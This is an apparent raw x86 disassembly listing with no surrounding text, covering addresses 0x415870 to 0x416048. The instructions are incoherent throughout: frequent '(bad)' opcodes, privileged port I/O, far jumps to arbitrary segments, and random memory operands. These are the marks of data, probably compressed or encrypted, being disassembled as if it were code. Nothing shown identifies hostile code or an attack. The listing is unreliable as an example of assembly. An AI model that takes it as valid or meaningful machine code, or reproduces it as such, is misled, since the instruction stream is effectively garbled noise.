  415870:	inc    edi
  415871:	stc    
  415872:	sub    ah,dl
  415874:	jmp    0x415833
  415876:	cmc    
  415877:	stc    
  415878:	fisub  DWORD PTR [edi-0x38]
  41587b:	gs (bad) 
  41587d:	sub    al,0xd2
  41587f:	inc    esp
  415880:	or     bh,BYTE PTR [edi]
  415882:	(bad)  
  415883:	mov    ds:0xa2a5669c,eax
  415888:	out    0xc2,al
  41588a:	pop    esp
  41588b:	mov    ds:0xa04f86bd,al
  415890:	xor    dh,BYTE PTR [edi]
  415892:	sub    ah,bh
  415894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415895:	(bad)  
  415896:	sar    DWORD PTR [ebx-0x27],1
  415899:	das    
  41589a:	in     eax,0x6b
  41589c:	es je  0x415827
  41589f:	aad    0x92
  4158a1:	into   
  4158a2:	(bad)  
  4158a3:	fld    TBYTE PTR [ecx-0x1e]
  4158a6:	test   ebp,esi
  4158a8:	mov    ds,WORD PTR [eax]
  4158aa:	mov    cl,0x2d
  4158ac:	(bad)  
  4158ad:	shl    ah,1
  4158af:	xchg   edi,eax
  4158b0:	mov    cl,0x25
  4158b2:	loope  0x41589d
  4158b4:	jb     0x415931
  4158b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b7:	shl    ah,1
  4158b9:	add    al,BYTE PTR [ebp+0x9]
  4158bc:	pop    ss
  4158bd:	imul   ebp,eax,0x79bca540
  4158c3:	xchg   BYTE PTR [ebp-0x3f3ba78e],ah
  4158c9:	push   ss
  4158ca:	loope  0x4158c5
  4158cc:	in     eax,0x6d
  4158ce:	inc    edi
  4158cf:	mov    ecx,0x2b17a3cd
  4158d4:	or     eax,ebp
  4158d6:	icebp  
  4158d7:	or     DWORD PTR [esi-0x76],edi
  4158da:	jmp    0xb126f0db
  4158df:	(bad)  
  4158e1:	or     bh,bl
  4158e3:	mov    eax,ds:0x27269aa0
  4158e8:	popa   
  4158e9:	cli    
  4158ea:	push   esi
  4158eb:	stos   BYTE PTR es:[edi],al
  4158ec:	xor    esp,DWORD PTR [ecx-0x41b4b2da]
  4158f2:	in     al,0x80
  4158f4:	sub    al,0xe9
  4158f6:	mov    esi,0xfc6542e1
  4158fb:	rcl    BYTE PTR [ebp-0x4f547e00],0x29
  415902:	or     eax,0x7ccda06d
  415907:	fs cmc 
  415909:	jo     0x415899
  41590b:	push   0x603e79a7
  415910:	out    dx,eax
  415911:	hlt    
  415912:	dec    esi
  415913:	je     0x4158f4
  415915:	pop    edi
  415916:	imul   eax
  415918:	or     eax,0x7624dd85
  41591d:	or     BYTE PTR [esi-0x76],al
  415920:	push   ecx
  415921:	pop    ds
  415922:	sbb    ebx,DWORD PTR [ecx-0x6]
  415925:	fdiv   DWORD PTR [edi-0xf]
  415928:	jmp    0xb1be:0x6023da6d
  41592f:	fnstcw WORD PTR [ebx-0x2d]
  415932:	cli    
  415933:	cmp    eax,0x66c69dbc
  415938:	mov    edi,0x103d6c11
  41593d:	loop   0x415952
  41593f:	xor    eax,0x7592ace8
  415944:	inc    ebx
  415945:	(bad)  
  415946:	jb     0x4158fc
  415948:	dec    ebp
  415949:	jle    0x415992
  41594b:	(bad)  
  41594c:	xor    ebp,ebx
  41594e:	pusha  
  41594f:	mov    cl,bl
  415951:	mov    esp,0x21ed444
  415956:	push   DWORD PTR [edx]
  415958:	add    ebp,DWORD PTR [esi*1+0x6fb4b711]
  41595f:	scas   al,BYTE PTR es:[edi]
  415960:	push   0xfffffffc
  415962:	pushf  
  415963:	xchg   DWORD PTR [edi],edx
  415965:	data16 cmp BYTE PTR [eax],al
  415968:	test   BYTE PTR [ebx+0xc],dl
  41596b:	aas    
  41596c:	ror    BYTE PTR [edx-0x7],1
  41596f:	test   DWORD PTR [ecx+esi*4-0x2a],0xbb74c5c9
  415977:	out    dx,al
  415978:	test   DWORD PTR [esi+0x54],ecx
  41597b:	fst    st(4)
  41597d:	cmp    ebp,edx
  41597f:	adc    al,BYTE PTR [eax-0x3]
  415982:	and    al,0x3a
  415984:	pop    edx
  415985:	and    BYTE PTR [ebp+0x488464d9],0xbd
  41598c:	test   eax,0x98cb516
  415991:	dec    ebx
  415992:	mov    ebx,0xf6550efb
  415997:	inc    esi
  415998:	jae    0x41597e
  41599a:	inc    edi
  41599b:	cwde   
  41599c:	(bad)  
  41599d:	xchg   ecx,eax
  41599e:	push   ebx
  41599f:	sbb    esp,DWORD PTR ds:0xfe191b05
  4159a5:	fiadd  WORD PTR [ecx]
  4159a7:	cmp    dh,ch
  4159a9:	adc    eax,0xb2625e35
  4159ae:	out    0x55,eax
  4159b0:	inc    ecx
  4159b1:	mov    cl,0x33
  4159b3:	dec    ebx
  4159b4:	adc    BYTE PTR [esp+edx*2-0x5a24adfe],dl
  4159bb:	mov    bh,cl
  4159bd:	ds jge 0x415a3e
  4159c0:	in     eax,0x7e
  4159c2:	fmul   QWORD PTR [esi+0x31af2b76]
  4159c8:	ret    
  4159c9:	cmp    eax,0xf8944d30
  4159ce:	call   0x2ce504ca
  4159d3:	mov    BYTE PTR [esi],bl
  4159d5:	sub    dh,BYTE PTR [ebx]
  4159d7:	das    
  4159d8:	adc    al,0x87
  4159da:	push   ebx
  4159db:	fisttp DWORD PTR [ebx+0x6e174578]
  4159e1:	pop    ss
  4159e2:	imul   eax,DWORD PTR [ebp+0x36cf0ea2],0x7f
  4159e9:	bound  eax,QWORD PTR [ebp-0xc]
  4159ec:	pop    ecx
  4159ed:	daa    
  4159ee:	mov    ebx,0xd056e89e
  4159f3:	dec    ecx
  4159f4:	xor    eax,0x46a1faf
  4159f9:	int    0xac
  4159fb:	mov    dh,0xe9
  4159fd:	fbstp  TBYTE PTR [esi]
  4159ff:	scas   al,BYTE PTR es:[edi]
  415a00:	jecxz  0x415a7a
  415a02:	enter  0xe054,0x1d
  415a06:	mov    ah,0xe7
  415a08:	pop    edi
  415a09:	push   edi
  415a0a:	jg     0x415a0e
  415a0c:	lea    esp,[edi+0x3cdd455d]
  415a12:	add    BYTE PTR [ecx],cl
  415a14:	mov    dl,0xdc
  415a16:	mov    ebp,0x5c315833
  415a1b:	loope  0x4159ac
  415a1d:	js     0x415a6d
  415a1f:	pop    ebx
  415a20:	ret    
  415a21:	pop    esi
  415a22:	mov    al,ds:0xc9367408
  415a27:	pop    eax
  415a28:	dec    edi
  415a29:	(bad)  
  415a2a:	sub    BYTE PTR [ecx-0x3e],dl
  415a2d:	adc    ebp,eax
  415a2f:	or     BYTE PTR [ebp+0x1d],bh
  415a32:	aam    0x77
  415a34:	mov    ch,0xd5
  415a36:	pop    ecx
  415a37:	inc    BYTE PTR [esi+ebx*4+0x7de72464]
  415a3e:	in     eax,0x5c
  415a40:	xchg   ebx,eax
  415a41:	jb     0x415a36
  415a43:	les    ecx,FWORD PTR [eax-0x6b73d243]
  415a49:	out    dx,eax
  415a4a:	mov    ch,0x71
  415a4c:	cmp    eax,0xc630cd89
  415a51:	jle    0x415a6e
  415a53:	jno    0x415a88
  415a55:	enter  0x55d8,0x84
  415a59:	fldenv [eax+edx*8]
  415a5c:	sbb    DWORD PTR [edx],ebx
  415a5e:	sbb    al,0xea
  415a60:	dec    esp
  415a61:	in     al,0xb2
  415a63:	out    dx,eax
  415a64:	push   ds
  415a65:	gs (bad) 
  415a67:	adc    eax,DWORD PTR [edx]
  415a69:	cmp    al,0x6f
  415a6b:	xchg   ebx,eax
  415a6c:	push   es
  415a6d:	outs   dx,BYTE PTR fs:[esi]
  415a6f:	outs   dx,BYTE PTR ds:[esi]
  415a70:	and    eax,0xffc1d8b1
  415a75:	lock and eax,0x1b1cafc9
  415a7b:	push   cs
  415a7c:	std    
  415a7d:	xor    al,0xe3
  415a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a80:	xchg   edi,eax
  415a81:	pop    ds
  415a82:	in     eax,dx
  415a83:	cdq    
  415a84:	(bad)  
  415a85:	je     0x415a13
  415a87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a88:	pop    ds
  415a89:	and    esi,DWORD PTR [ebp+0x768ad1e5]
  415a8f:	test   ecx,0x92f74596
  415a95:	jmp    0xc276:0x37f0bee7
  415a9c:	xor    BYTE PTR [ecx+0x77],bh
  415a9f:	(bad)  
  415aa0:	and    al,BYTE PTR [esi+ecx*8]
  415aa3:	pusha  
  415aa4:	ret    
  415aa5:	and    BYTE PTR [ebp+0x776bfcf7],cl
  415aab:	sub    eax,0x5ff68877
  415ab0:	js     0x415abd
  415ab2:	(bad)  
  415ab3:	(bad)  
  415ab4:	and    al,0xd3
  415ab6:	fs xchg esp,eax
  415ab8:	leave  
  415ab9:	rol    BYTE PTR [edi-0x2e],cl
  415abc:	jle    0x415af3
  415abe:	pop    edi
  415abf:	in     al,dx
  415ac0:	loope  0x415b0e
  415ac2:	pop    edx
  415ac3:	push   0xffffff96
  415ac5:	ins    BYTE PTR es:[edi],dx
  415ac6:	ss jbe 0x415b2d
  415ac9:	mov    ecx,0xe8e9c074
  415ace:	jmp    0x415ae9
  415ad0:	jge    0x415b35
  415ad2:	dec    edi
  415ad3:	or     dh,al
  415ad5:	mov    eax,ds:0xd4cd27a2
  415ada:	shl    BYTE PTR [edx-0x3ed82a9b],0x4b
  415ae1:	popf   
  415ae2:	repnz pop ebx
  415ae4:	cmp    ah,BYTE PTR gs:[ebp-0x56838272]
  415aeb:	leave  
  415aec:	jb     0x415a75
  415aee:	call   0x768e89de
  415af3:	daa    
  415af4:	(bad)  
  415af5:	repnz fld DWORD PTR [eax-0x2b]
  415af9:	rcl    DWORD PTR [ebx+esi*2+0x290f570c],0xe4
  415b01:	sahf   
  415b02:	shl    edi,0xfa
  415b05:	fnstenv [edi]
  415b07:	jmp    0x440e:0x58c13815
  415b0e:	mov    eax,ds:0x2df79113
  415b13:	pop    eax
  415b14:	and    al,0x35
  415b16:	fbstp  TBYTE PTR [ebx+0x17]
  415b19:	sub    edi,DWORD PTR ds:0x843cda7c
  415b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b20:	jecxz  0x415aa8
  415b22:	fsubp  st(6),st
  415b24:	imul   ebx,DWORD PTR [edx+0x78],0xffffff8f
  415b28:	sbb    DWORD PTR [ebp+ebp*4-0x71483e97],ebp
  415b2f:	mov    ch,bh
  415b31:	and    esp,DWORD PTR [ebp+0x7b4b851e]
  415b37:	xchg   edi,eax
  415b38:	(bad)  
  415b3a:	jge    0x415b8b
  415b3c:	call   0xf3c3f248
  415b41:	sar    edx,cl
  415b43:	call   DWORD PTR [eax-0x4d]
  415b46:	jmp    0x306c8284
  415b4b:	out    0x47,eax
  415b4d:	repz push esi
  415b4f:	inc    esi
  415b50:	add    ebx,DWORD PTR [edx-0x75e1a946]
  415b56:	arpl   WORD PTR [esi+ebx*4],si
  415b59:	cmp    DWORD PTR [edx+0x3b],ebp
  415b5c:	inc    esi
  415b5d:	fdiv   QWORD PTR [ebx-0x2178e442]
  415b63:	out    0x5b,eax
  415b65:	sar    BYTE PTR [ebp+0x2b],0x24
  415b69:	retf   0x38ad
  415b6c:	jl     0x415b77
  415b6e:	(bad)  
  415b70:	data16 js 0x415b61
  415b73:	nop
  415b74:	mov    ah,0x5c
  415b76:	mov    dl,0x2c
  415b78:	cmp    DWORD PTR [edx+0x20],0xffffffd0
  415b7c:	mov    al,0x66
  415b7e:	pusha  
  415b7f:	dec    eax
  415b80:	pop    ecx
  415b81:	pop    esp
  415b82:	add    bh,ah
  415b84:	jne    0x415bf9
  415b86:	ret    
  415b87:	test   eax,0xf6b6e084
  415b8c:	sub    BYTE PTR [esi-0x10],dh
  415b8f:	outs   dx,BYTE PTR ds:[esi]
  415b90:	xchg   edx,eax
  415b91:	into   
  415b92:	jle    0x415b57
  415b94:	loopne 0x415b49
  415b96:	jbe    0x415b27
  415b98:	je     0x415c04
  415b9a:	cmp    BYTE PTR [ebx+0x6f],bh
  415b9d:	mov    dh,0x98
  415b9f:	scas   eax,DWORD PTR es:[edi]
  415ba0:	add    eax,0x9aeae532
  415ba5:	iret   
  415ba6:	loopne 0x415bab
  415ba8:	pop    ds
  415ba9:	ds je  0x415b5f
  415bac:	sub    al,0x9e
  415bae:	push   esi
  415baf:	xor    esp,DWORD PTR [esi+0x75]
  415bb2:	mov    cl,0xc5
  415bb4:	xlat   BYTE PTR ds:[ebx]
  415bb5:	push   ebx
  415bb6:	sbb    bh,BYTE PTR ds:0xd81c0a36
  415bbc:	outs   dx,BYTE PTR ds:[esi]
  415bbd:	dec    esi
  415bbe:	inc    ebx
  415bbf:	jb     0x415c0c
  415bc1:	mov    ah,0x9d
  415bc3:	outs   dx,DWORD PTR ds:[esi]
  415bc4:	pop    ebp
  415bc5:	ror    DWORD PTR [edi+0x2b70c816],0xf9
  415bcc:	repz scas al,BYTE PTR es:[edi]
  415bce:	loope  0x415bd5
  415bd0:	mov    edi,0xfed9b951
  415bd5:	hlt    
  415bd6:	mov    DWORD PTR [ebp+0xb0302d6],ecx
  415bdc:	data16 in al,0x7e
  415bdf:	arpl   WORD PTR [edx],dx
  415be1:	fistp  WORD PTR [edx-0x28]
  415be4:	xor    al,0x2b
  415be6:	pushf  
  415be7:	stc    
  415be8:	sbb    BYTE PTR [eax+0x639a0ade],0x8b
  415bef:	cmp    ebx,DWORD PTR [eax]
  415bf1:	or     BYTE PTR [ebp+0x3a],dl
  415bf4:	or     DWORD PTR ds:0x6a8ceee3,0x50
  415bfb:	inc    esp
  415bfc:	inc    eax
  415bfd:	push   cs
  415bfe:	cmp    BYTE PTR [edi-0x3f],cl
  415c01:	call   0xc348b549
  415c06:	or     eax,0xfa2ab78f
  415c0b:	adc    DWORD PTR [edx],esp
  415c0d:	mov    edi,eax
  415c0f:	pushf  
  415c10:	(bad)  
  415c11:	ret    
  415c12:	inc    edx
  415c13:	dec    ebx
  415c14:	inc    edi
  415c15:	mov    ecx,esi
  415c17:	mov    ch,dh
  415c19:	pop    ebp
  415c1a:	mov    al,ds:0x936619a9
  415c1f:	mov    edi,DWORD PTR [eax+0x7]
  415c22:	aaa    
  415c23:	loopne 0x415bdf
  415c25:	punpckhqdq xmm3,xmm4
  415c29:	gs push eax
  415c2b:	add    cl,0x5a
  415c2e:	and    BYTE PTR [eax+0x1ea78af1],ch
  415c34:	and    al,0xb2
  415c36:	in     eax,0xb
  415c38:	sub    ebp,edi
  415c3a:	ins    BYTE PTR es:[edi],dx
  415c3b:	dec    esi
  415c3c:	xchg   ebx,eax
  415c3d:	(bad)  
  415c3e:	in     eax,dx
  415c3f:	rcl    DWORD PTR [ecx-0x3b],1
  415c42:	pop    esp
  415c43:	aas    
  415c44:	inc    eax
  415c45:	sbb    DWORD PTR ds:0x735c53f4,edx
  415c4b:	mov    ebx,0xf3022328
  415c50:	lahf   
  415c51:	mov    edx,0x872010b9
  415c56:	(bad)  
  415c57:	pop    edi
  415c58:	imul   BYTE PTR [esi+edi*2]
  415c5b:	aam    0xe0
  415c5d:	mov    eax,0x7288d559
  415c62:	cmp    eax,0xf8e9d8a9
  415c67:	ins    BYTE PTR es:[edi],dx
  415c68:	sub    al,BYTE PTR [ebx+esi*4]
  415c6b:	ss popf 
  415c6d:	pop    ecx
  415c6e:	gs cmp eax,0x26fe7708
  415c74:	fst    QWORD PTR [edi+0x2fe7e960]
  415c7a:	mov    ecx,0x90a8d650
  415c7f:	mov    al,0xcf
  415c81:	daa    
  415c82:	outs   dx,DWORD PTR ds:[esi]
  415c83:	jbe    0x415c63
  415c85:	jp     0x415cf8
  415c87:	jne    0x415c43
  415c89:	call   0x5e19:0x86e211d4
  415c90:	push   ebx
  415c91:	push   edx
  415c92:	inc    eax
  415c93:	push   esp
  415c94:	pop    ds
  415c95:	(bad)  
  415c96:	mov    ah,0x20
  415c98:	jp     0x415c1c
  415c9a:	sbb    BYTE PTR [ebp-0x7175e22b],0x43
  415ca1:	enter  0xc5c,0x6
  415ca5:	pandn  mm5,QWORD PTR [ecx-0xfea0523]
  415cac:	and    al,0xed
  415cae:	in     eax,0xc5
  415cb0:	ds push es
  415cb2:	call   0xbeae:0x45c0c63e
  415cb9:	pop    edi
  415cba:	sbb    esi,DWORD PTR [ebp-0x5a506b71]
  415cc0:	jo     0x415d2e
  415cc2:	and    edi,DWORD PTR [edi+0x6c]
  415cc5:	scas   al,BYTE PTR es:[edi]
  415cc6:	xor    BYTE PTR [edi+0x25],ch
  415cc9:	stos   BYTE PTR es:[edi],al
  415cca:	sbb    BYTE PTR [edi],cl
  415ccc:	cmp    bl,ch
  415cce:	iret   
  415ccf:	mov    edx,0x4639fd65
  415cd4:	add    al,0xdb
  415cd6:	repz ja 0x415cb3
  415cd9:	ja     0x415c7d
  415cdb:	repz scas eax,DWORD PTR es:[edi]
  415cdd:	jp     0x415d29
  415cdf:	push   ss
  415ce0:	dec    eax
  415ce1:	arpl   WORD PTR [edi+ebp*1-0x1e],ax
  415ce5:	clc    
  415ce6:	cmp    BYTE PTR [edx-0xa],dh
  415ce9:	mov    ah,0xb0
  415ceb:	inc    ebx
  415cec:	ret    
  415ced:	push   ss
  415cee:	retf   
  415cef:	xchg   ebx,eax
  415cf0:	add    edi,ecx
  415cf2:	pop    ecx
  415cf3:	adc    al,0x32
  415cf5:	inc    ecx
  415cf6:	xor    esp,DWORD PTR [edi]
  415cf8:	stc    
  415cf9:	jb     0x415d48
  415cfb:	imul   edi,ecx,0x4e1798ca
  415d01:	inc    edi
  415d02:	pop    ebp
  415d03:	mov    ebx,0xb47a95f6
  415d08:	or     eax,0x70f0893e
  415d0d:	test   al,0x66
  415d0f:	push   edi
  415d10:	or     DWORD PTR es:[eax+eax*1+0x5cc45e2a],eax
  415d18:	sbb    esi,DWORD PTR [ebp-0x6f]
  415d1b:	dec    esp
  415d1c:	js     0x415d04
  415d1e:	push   esp
  415d1f:	or     eax,0xa7f0dc8a
  415d24:	push   0xf88f7993
  415d29:	fnsave [ebp-0x3a04675e]
  415d2f:	and    eax,0xae66f39
  415d34:	and    esi,ebx
  415d36:	fwait
  415d37:	ins    DWORD PTR es:[edi],dx
  415d38:	lock mov al,0x89
  415d3b:	adc    DWORD PTR [edi+0x26cfae20],ebp
  415d41:	jmp    0xf305:0x201b6be9
  415d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d49:	dec    ebx
  415d4a:	aaa    
  415d4b:	and    DWORD PTR [ebx+ebp*8],0x6b53bf0b
  415d52:	daa    
  415d53:	mov    BYTE PTR [ecx],dl
  415d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d56:	fld    QWORD PTR [edx]
  415d58:	fwait
  415d59:	mov    edx,0xa733c09c
  415d5e:	and    cl,BYTE PTR [esi]
  415d60:	sbb    dl,BYTE PTR [edi+0x4f]
  415d63:	inc    ebp
  415d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d65:	scas   eax,DWORD PTR es:[edi]
  415d66:	aam    0x8
  415d68:	jns    0x415d78
  415d6a:	shl    ah,cl
  415d6c:	push   ecx
  415d6d:	out    dx,al
  415d6e:	push   eax
  415d6f:	das    
  415d70:	or     eax,DWORD PTR [ebp+0x341fcf90]
  415d76:	mov    eax,ds:0xb3bdde12
  415d7b:	in     al,0x24
  415d7d:	mov    bl,0x29
  415d7f:	in     eax,0x35
  415d81:	dec    edx
  415d82:	adc    DWORD PTR [esi-0x5a983de8],edi
  415d88:	xor    bh,ah
  415d8a:	mov    es,WORD PTR [edi+0x4ffe2b36]
  415d90:	push   ss
  415d91:	test   eax,0xadac8d20
  415d96:	mov    bh,0xd0
  415d98:	mov    dl,0xa2
  415d9a:	sbb    al,0x8d
  415d9c:	push   edx
  415d9d:	mov    ds:0x9e4508e1,eax
  415da2:	adc    ah,BYTE PTR [esi-0x24c15073]
  415da8:	mov    ebp,0x50676ad7
  415dad:	addr16 mov bl,0x54
  415db0:	mov    cl,0xf3
  415db2:	xchg   esi,eax
  415db3:	jle    0x415dbb
  415db5:	fxch   st(7)
  415db7:	cdq    
  415db8:	call   0xa659:0xa6c0439c
  415dbf:	jbe    0x415d4c
  415dc1:	mov    ecx,?
  415dc3:	stos   DWORD PTR es:[edi],eax
  415dc4:	stc    
  415dc5:	pushf  
  415dc6:	stos   BYTE PTR es:[edi],al
  415dc7:	dec    esi
  415dc8:	popa   
  415dc9:	out    dx,al
  415dca:	lds    eax,FWORD PTR [edx]
  415dcc:	jns    0x415e3e
  415dce:	push   eax
  415dcf:	inc    edi
  415dd0:	dec    si
  415dd2:	ret    0xe5fc
  415dd5:	inc    ebp
  415dd6:	cdq    
  415dd7:	inc    ecx
  415dd8:	push   ebp
  415dd9:	scas   al,BYTE PTR es:[edi]
  415dda:	inc    edi
  415ddb:	mov    edx,0x71e31d7a
  415de0:	(bad)  
  415de2:	or     BYTE PTR [edi-0x50be4dba],al
  415de8:	sbb    dh,bl
  415dea:	cmp    eax,0x3c08373c
  415def:	call   0x2793af69
  415df4:	mov    bl,0x15
  415df6:	call   0x95758a47
  415dfb:	jns    0x415e04
  415dfd:	in     al,0xa1
  415dff:	lods   al,BYTE PTR ds:[esi]
  415e00:	lock or BYTE PTR [ecx],ah
  415e03:	std    
  415e04:	adc    al,0xbc
  415e06:	ret    0x87b7
  415e09:	mov    ds:0x816e4688,eax
  415e0e:	std    
  415e0f:	sbb    al,ah
  415e11:	xchg   esi,eax
  415e12:	xor    dl,BYTE PTR [edx+0x7db0f2e]
  415e18:	mov    ch,BYTE PTR [esi+0x766c2fd4]
  415e1e:	fwait
  415e1f:	inc    esp
  415e20:	jmp    0x618fba38
  415e25:	shl    DWORD PTR [edx+ebx*2+0x34],0xf0
  415e2a:	or     edx,eax
  415e2c:	in     al,dx
  415e2d:	sub    BYTE PTR [edi+0x5fe97041],bl
  415e33:	dec    esi
  415e34:	push   esp
  415e35:	les    ebx,FWORD PTR [edx+0x6815c19f]
  415e3b:	mov    cs,WORD PTR [ecx+0x28]
  415e3e:	add    eax,0x932c01be
  415e43:	cmp    ebp,eax
  415e45:	rol    DWORD PTR [edx],0x1e
  415e48:	xor    eax,DWORD PTR ds:0x16f25395
  415e4e:	pop    ebx
  415e4f:	sub    BYTE PTR [esi],0x29
  415e52:	not    ecx
  415e54:	mov    al,ds:0x36a32913
  415e59:	(bad)  
  415e5a:	icebp  
  415e5b:	test   eax,0x8ac26991
  415e60:	jecxz  0x415e9c
  415e62:	xchg   ebx,eax
  415e63:	(bad)  
  415e65:	dec    ebp
  415e66:	cmp    ch,BYTE PTR [ecx+edi*8+0x2efb3e68]
  415e6d:	add    DWORD PTR [edi],ecx
  415e6f:	jge    0x415ed7
  415e71:	sub    BYTE PTR [edx+0x10abd75f],cl
  415e77:	jbe    0x415e8c
  415e79:	std    
  415e7a:	and    bh,BYTE PTR [edx+0x52]
  415e7d:	pop    ss
  415e7e:	ds sahf 
  415e80:	imul   ecx,DWORD PTR [edx+0x73],0xffffff8f
  415e84:	pop    esp
  415e85:	jmp    0x415e50
  415e87:	js     0x415ed7
  415e89:	nop
  415e8a:	sbb    ebx,DWORD PTR ds:0x60835314
  415e90:	cmp    BYTE PTR [ebx-0x2e],bl
  415e93:	jg     0x415e2c
  415e95:	mov    edi,0x48162fb6
  415e9a:	mov    bl,0x81
  415e9c:	and    eax,0x543449ea
  415ea1:	lahf   
  415ea2:	ins    BYTE PTR es:[edi],dx
  415ea3:	fmul   DWORD PTR [esi+0x90bb9e8]
  415ea9:	jmp    0x415e8d
  415eab:	and    esi,edi
  415ead:	sbb    DWORD PTR [ecx+0x36f1d611],edx
  415eb3:	jmp    0xee52345d
  415eb8:	xchg   ebp,eax
  415eb9:	retf   
  415eba:	and    dh,BYTE PTR [ecx]
  415ebc:	sbb    eax,0x413fcb05
  415ec1:	fidivr WORD PTR es:[ebx+eiz*1-0x46]
  415ec6:	stc    
  415ec7:	or     cl,ch
  415ec9:	idiv   DWORD PTR [ebp+0xd]
  415ecc:	lahf   
  415ecd:	shr    edi,1
  415ecf:	push   ebx
  415ed0:	aas    
  415ed1:	lea    edx,[ebx+ecx*8+0x7081f402]
  415ed8:	mov    BYTE PTR [ebx],cl
  415eda:	jb     0x415f07
  415edc:	sub    BYTE PTR [ebx-0x62],cl
  415edf:	cmp    edx,DWORD PTR [eax+esi*8-0x6e2d85df]
  415ee6:	ss fwait
  415ee8:	or     eax,0xb424414f
  415eed:	stos   DWORD PTR es:[edi],eax
  415eee:	mov    cl,0xfd
  415ef0:	in     al,0x93
  415ef2:	mov    al,ds:0x2759c664
  415ef7:	add    al,0x7f
  415ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415efa:	jbe    0x415eca
  415efc:	mov    DWORD PTR [ebx-0x3e3f8ee4],esp
  415f02:	cdq    
  415f03:	imul   edx,DWORD PTR cs:[esi-0x6b20c138],0xffffff93
  415f0b:	lods   al,BYTE PTR ds:[esi]
  415f0c:	fwait
  415f0d:	xor    DWORD PTR [edi+0x10a2cb21],esp
  415f13:	mov    ecx,0x5b1af413
  415f18:	leave  
  415f19:	(bad)  
  415f1a:	and    eax,0xc69c76fa
  415f1f:	scas   eax,DWORD PTR es:[edi]
  415f20:	pop    es
  415f21:	xor    edx,edx
  415f23:	mov    dl,0x8b
  415f25:	addr16 xor al,0xee
  415f28:	in     al,dx
  415f29:	pop    edx
  415f2a:	push   ss
  415f2b:	jns    0x415ef1
  415f2d:	inc    ecx
  415f2e:	add    edi,DWORD PTR [edx]
  415f30:	xor    DWORD PTR [ebx-0x63],ebp
  415f33:	lds    ecx,FWORD PTR [ecx-0x514da5f3]
  415f39:	outs   dx,BYTE PTR ds:[esi]
  415f3a:	inc    ebp
  415f3b:	clc    
  415f3c:	pop    esp
  415f3d:	out    dx,al
  415f3e:	and    DWORD PTR [ecx+edx*4+0x5b],ebx
  415f42:	push   esi
  415f43:	imul   edi,DWORD PTR [eax],0x2de0f456
  415f49:	sbb    BYTE PTR [ecx],0x6d
  415f4c:	mov    ah,0x5d
  415f4e:	pop    DWORD PTR [edx]
  415f50:	dec    ebx
  415f51:	lods   eax,DWORD PTR ds:[esi]
  415f52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f53:	dec    ebp
  415f54:	popf   
  415f55:	outs   dx,BYTE PTR ds:[esi]
  415f56:	jns    0x415f2e
  415f58:	pop    edx
  415f59:	xchg   edx,eax
  415f5a:	mov    eax,0x133f47d8
  415f5f:	pop    ebp
  415f60:	ja     0x415fc9
  415f62:	sti    
  415f63:	sbb    DWORD PTR [ebx+0x2fa4bae7],eax
  415f69:	enter  0x2f8d,0xe1
  415f6d:	jns    0x415f3b
  415f6f:	std    
  415f70:	sub    al,0x79
  415f72:	pop    edi
  415f73:	test   BYTE PTR [edi-0x7ca97f5a],0xe5
  415f7a:	inc    ebx
  415f7b:	fsubr  QWORD PTR [edx]
  415f7d:	ins    BYTE PTR es:[edi],dx
  415f7e:	jmp    0x4e3b:0x3761affe
  415f85:	bound  eax,QWORD PTR [edx-0x12b496f8]
  415f8b:	(bad)
  415f8f:	mov    dh,0x7a
  415f91:	or     bh,ch
  415f93:	add    edi,DWORD PTR [ecx]
  415f95:	int    0x8
  415f97:	xor    ch,BYTE PTR [edx+0x78262735]
  415f9d:	mov    bh,0xe3
  415f9f:	push   ebx
  415fa0:	js     0x415fb1
  415fa2:	and    DWORD PTR [ebx-0x3215883b],ebp
  415fa8:	jmp    ecx
  415faa:	test   BYTE PTR [esi+0x5a],0x8a
  415fae:	cdq    
  415faf:	and    eax,DWORD PTR [esi]
  415fb1:	sub    al,0x2f
  415fb3:	out    0x55,al
  415fb5:	sub    edx,0x2aeb82af
  415fbb:	cmc    
  415fbc:	fnstcw WORD PTR es:[ebp-0x6f]
  415fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fc1:	ss mov ebx,0x14e70736
  415fc7:	div    BYTE PTR [edx+0x5817687a]
  415fcd:	mov    ecx,0x890b7d2b
  415fd2:	aam    0x93
  415fd4:	cmp    DWORD PTR [edx],esp
  415fd6:	test   DWORD PTR [esp+edi*1+0x3e],edi
  415fda:	or     eax,0x7c375e75
  415fdf:	sbb    ecx,DWORD PTR [eax]
  415fe1:	dec    ebx
  415fe2:	je     0x415fc8
  415fe4:	xchg   ebx,eax
  415fe5:	ins    BYTE PTR es:[edi],dx
  415fe6:	out    dx,eax
  415fe7:	xchg   DWORD PTR [ebx+0x3c],esp
  415fea:	enter  0x85a8,0x73
  415fee:	call   DWORD PTR [edi+0x7a6b3151]
  415ff4:	adc    eax,0xe11b6f73
  415ff9:	sub    esi,esi
  415ffb:	jp     0x416003
  415ffd:	dec    ebx
  415ffe:	scas   al,BYTE PTR es:[edi]
  415fff:	or     BYTE PTR [edx+0xf81487f],bl
  416005:	mov    dl,0xa1
  416007:	adc    bl,BYTE PTR [ebp-0x2d0fb489]
  41600d:	sti    
  41600e:	ss aam 0x4f
  416011:	sbb    al,0x8b
  416013:	mov    ds:0xc2e8fbab,al
  416018:	jae    0x416081
  41601a:	pop    esp
  41601b:	repz icebp 
  41601d:	(bad)  
  41601e:	mov    dh,0xf8
  416020:	add    edx,DWORD PTR [edi-0x15432fd8]
  416026:	test   DWORD PTR [ebx-0x6f48bdab],ecx
  41602c:	dec    edx
  41602d:	adc    ecx,DWORD PTR [ecx]
  41602f:	xchg   ebx,eax
  416030:	push   edi
  416031:	pop    es
  416032:	mov    eax,0xb27ef6cd
  416037:	dec    eax
  416038:	inc    esi
  416039:	jge    0x416050
  41603b:	xor    dh,BYTE PTR [esi]
  41603d:	pop    ebp
  41603e:	or     ah,cl
  416040:	lea    ecx,[ecx-0x77fca8f9]
  416046:	push   0xffffff9f
  416048:	sar    BYTE PTR [edi+0xe],1
